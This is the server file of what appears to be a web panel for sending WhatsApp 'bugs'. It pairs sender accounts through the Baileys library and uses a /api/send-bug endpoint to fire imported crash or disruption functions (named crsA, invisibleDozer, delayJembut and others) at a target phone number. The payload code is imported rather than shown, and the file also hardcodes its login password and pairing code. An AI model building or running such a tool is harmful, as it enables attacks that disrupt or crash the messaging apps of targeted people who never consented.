const express = require('express');
const session = require('express-session');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, Browsers } = require('@whiskeysockets/baileys');
const { blankButton, Blank2, crsA, bClck, invisibleDozer, delayJembut } = require('./function');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: 'sysxbugsecret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));
app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));

// Setup multer
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const folder = file.fieldname === 'animation' ? 'uploads/animation' : 'uploads/profile';
        if (!fs.existsSync(folder)) fs.mkdirSync(folder, { recursive: true });
        cb(null, folder);
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    }
});
const upload = multer({ storage });

// Settings
const settingsFile = './settings.json';
let settings = {};
if (fs.existsSync(settingsFile)) {
    settings = JSON.parse(fs.readFileSync(settingsFile));
} else {
    settings = { animationVideo: '', profileVideo: '' };
}
function saveSettings() {
    fs.writeFileSync(settingsFile, JSON.stringify(settings));
}

// Sessions (sock per phone)
const sessions = {};
let pairedSenders = [];

// Helper: get or create sock
async function getSock(phoneNumber) {
    if (sessions[phoneNumber]?.sock) return sessions[phoneNumber].sock;
    const { state, saveCreds } = await useMultiFileAuthState(`auth_info_baileys_${phoneNumber}`);
    const sock = makeWASocket({
        auth: state,
        browser: Browsers.ubuntu('Chrome'),
        printQRInTerminal: false,
        syncFullHistory: false,
        markOnlineOnConnect: false,
    });
    sock.ev.on('creds.update', saveCreds);
    sessions[phoneNumber] = { sock, state };
    return sock;
}

// Pairing
async function pairDevice(phoneNumber) {
    const sock = await getSock(phoneNumber);
    const code = await sock.requestPairingCode(phoneNumber);
    return code;
}

// ---------- API Routes ----------

app.post('/api/login', (req, res) => {
    const { password } = req.body;
    if (password === 'Zrowr') {
        req.session.loggedIn = true;
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false, message: 'Password salah' });
    }
});

app.get('/api/status', (req, res) => {
    res.json({ loggedIn: req.session.loggedIn || false });
});

app.get('/api/settings', (req, res) => {
    if (!req.session.loggedIn) return res.status(401).json({ error: 'Unauthorized' });
    res.json(settings);
});

app.post('/api/upload/animation', upload.single('animation'), (req, res) => {
    if (!req.session.loggedIn) return res.status(401).json({ error: 'Unauthorized' });
    if (req.file) {
        settings.animationVideo = '/uploads/animation/' + req.file.filename;
        saveSettings();
        res.json({ success: true, path: settings.animationVideo });
    } else {
        res.status(400).json({ success: false, message: 'No file' });
    }
});

app.post('/api/upload/profile', upload.single('profile'), (req, res) => {
    if (!req.session.loggedIn) return res.status(401).json({ error: 'Unauthorized' });
    if (req.file) {
        settings.profileVideo = '/uploads/profile/' + req.file.filename;
        saveSettings();
        res.json({ success: true, path: settings.profileVideo });
    } else {
        res.status(400).json({ success: false, message: 'No file' });
    }
});

app.post('/api/pair', async (req, res) => {
    if (!req.session.loggedIn) return res.status(401).json({ error: 'Unauthorized' });
    const { phone, pairingCode } = req.body;
    if (!phone || !pairingCode) return res.status(400).json({ error: 'Phone and pairing code required' });
    if (pairingCode !== 'SYSX-BUGX') return res.status(403).json({ error: 'Kode pairing salah' });
    if (!phone.match(/^62\d+$/)) return res.status(400).json({ error: 'Nomor harus diawali 62 dan hanya angka' });
    try {
        const code = await pairDevice(phone);
        if (!pairedSenders.includes(phone)) pairedSenders.push(phone);
        res.json({ success: true, message: 'Pairing berhasil', pairingCode: code, phone });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Gagal pairing: ' + error.message });
    }
});

app.get('/api/senders', (req, res) => {
    if (!req.session.loggedIn) return res.status(401).json({ error: 'Unauthorized' });
    res.json(pairedSenders);
});

app.post('/api/send-bug', async (req, res) => {
    if (!req.session.loggedIn) return res.status(401).json({ error: 'Unauthorized' });
    const { sender, target, bugType } = req.body;
    if (!sender || !target || !bugType) return res.status(400).json({ error: 'Sender, target, dan bug type diperlukan' });
    if (!pairedSenders.includes(sender)) return res.status(403).json({ error: 'Sender tidak terdaftar' });
    if (!target.match(/^62\d+$/)) return res.status(400).json({ error: 'Nomor target harus diawali 62 dan hanya angka' });
    const sock = sessions[sender]?.sock;
    if (!sock) return res.status(500).json({ error: 'Sender tidak terhubung' });

    const bugFunctions = { blankButton, Blank2, crsA, bClck, invisibleDozer, delayJembut };
    const func = bugFunctions[bugType];
    if (!func) return res.status(400).json({ error: 'Bug type tidak dikenal' });

    try {
        await func(sock, target + '@s.whatsapp.net');
        res.json({ success: true, message: `Bug ${bugType} dikirim ke ${target}` });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Gagal mengirim bug: ' + error.message });
    }
});

app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));